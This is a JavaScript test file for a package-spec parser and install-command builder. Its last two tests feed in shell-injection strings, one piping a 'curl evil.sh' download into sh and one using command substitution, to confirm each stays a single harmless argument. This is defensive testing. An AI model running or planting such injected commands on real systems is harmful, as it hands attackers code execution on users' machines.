import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { parsePkgSpec, buildInstallSpec } from "./pkg.js";

describe("parsePkgSpec", () => {
  it("parses ecosystem:name@version", () => {
    assert.deepEqual(parsePkgSpec("npm:express@4.18.0"), {
      ecosystem: "npm",
      name: "express",
      version: "4.18.0",
    });
  });

  it("parses a scoped package with a version", () => {
    assert.deepEqual(parsePkgSpec("npm:@socketsecurity/cli@1.0.0"), {
      ecosystem: "npm",
      name: "@socketsecurity/cli",
      version: "1.0.0",
    });
  });

  it("parses a name without a version", () => {
    assert.deepEqual(parsePkgSpec("cargo:ripgrep"), {
      ecosystem: "cargo",
      name: "ripgrep",
      version: undefined,
    });
  });

  it("returns null when there is no ecosystem prefix", () => {
    assert.equal(parsePkgSpec("express"), null);
  });
});

describe("buildInstallSpec — no-shell argv contract", () => {
  it("builds (bin, args[]) for each ecosystem, never a shell string", () => {
    assert.deepEqual(buildInstallSpec({ ecosystem: "npm", name: "express", version: "4.18.0" }), {
      bin: "npm",
      args: ["install", "express@4.18.0"],
    });
    assert.deepEqual(buildInstallSpec({ ecosystem: "pip", name: "requests", version: "2.31.0" }), {
      bin: "pip",
      args: ["install", "requests==2.31.0"],
    });
    assert.deepEqual(buildInstallSpec({ ecosystem: "docker", name: "redis" }), {
      bin: "docker",
      args: ["pull", "redis:latest"],
    });
  });

  it("returns null for an unknown ecosystem", () => {
    assert.equal(buildInstallSpec({ ecosystem: "haxe", name: "whatever" }), null);
  });

  it("keeps shell metacharacters in the name as a SINGLE argv element (injection inert)", () => {
    // A malicious version that would be catastrophic under a shell:
    //   `npm install express@1; curl evil.sh | sh`
    // Under execFile the entire string is one argv element — the package
    // manager simply rejects it; no second command can run.
    const spec = parsePkgSpec("npm:express@1; curl evil.sh | sh");
    assert.ok(spec);
    const install = buildInstallSpec(spec);
    assert.ok(install);
    assert.equal(install.bin, "npm");
    assert.equal(install.args.length, 2, "must not split into extra argv elements");
    assert.equal(install.args[0], "install");
    assert.equal(install.args[1], "express@1; curl evil.sh | sh");
  });

  it("treats backtick / command-substitution names as one inert argv element", () => {
    const install = buildInstallSpec({ ecosystem: "cargo", name: "$(touch pwned)`id`" });
    assert.ok(install);
    assert.deepEqual(install.args, ["install", "$(touch pwned)`id`"]);
  });
});
